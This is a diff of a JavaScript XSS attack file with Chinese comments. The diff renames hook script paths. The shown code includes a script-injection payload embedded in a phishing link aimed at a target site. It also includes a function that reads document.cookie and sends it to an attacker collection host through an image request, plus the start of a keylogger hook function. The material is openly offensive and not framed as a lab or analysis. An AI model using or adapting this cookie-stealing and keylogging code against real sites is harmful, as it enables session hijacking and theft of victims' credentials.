@@ -8,20 +8,20 @@
 
 http://target.vulhost.com/xss.php # 目标站点
 http://gofish.hack.net/index.jsp # 社工伪造钓鱼网站
-http://hook.hack.net/xss_hook.js # hook 站点
-http://collect.hack.net/xss_hook2email.php # 通过hook 站点收集信息的站点
+http://hook.hack.net/hook_xss.js # hook 站点
+http://collect.hack.net/hook_xss2email.php # 通过hook 站点收集信息的站点
 */
 
 
-// 钓鱼网站包含超链接 http://target.vulhost.com/xss.php?id=<script src=http://hook.hack.net/xss_hook.js></script>
+// 钓鱼网站包含超链接 http://target.vulhost.com/xss.php?id=<script src=http://hook.hack.net/hook_xss.js></script>
 
 // XSS Hook Cookie
-// 钓鱼网站包含超链接 http://target.vulhost.com/xss.php?id=<script src=http://hook.hack.net/xss_hook_cookie.js></script>
+// 钓鱼网站包含超链接 http://target.vulhost.com/xss.php?id=<script src=http://hook.hack.net/hook_xss_cookie.js></script>
 function sendCookieToServer() {
     //制作一个图片，图片连接即讲过cookie 发给服务端
     var img = new Image();
     var target_cookie = escape(document.cookie);
-    var collect_hacker_host = "http://collect.hack.net/xss_hook.php?sid=" // 通过hook 站点收集信息的站点
+    var collect_hacker_host = "http://collect.hack.net/hook_xss.php?sid=" // 通过hook 站点收集信息的站点
     img.src = collect_hacker_host + target_cookie;
 
     //var target_cookie = escape(document.cookie);
@@ -29,7 +29,7 @@ function sendCookieToServer() {
 }
 
 // XSS Hook KeyLogger
-// 钓鱼网站包含超链接 http://target.vulhost.com/xss.php?id=<script src=http://hook.hack.net/xss_hook_keylogger.js></script>
+// 钓鱼网站包含超链接 http://target.vulhost.com/xss.php?id=<script src=http://hook.hack.net/hook_xss_keylogger.js></script>
 function sendKeyLoggerToServer() {
     const evt = evt || window.event;
     const key = String.fromCharCode(evt.charCode);
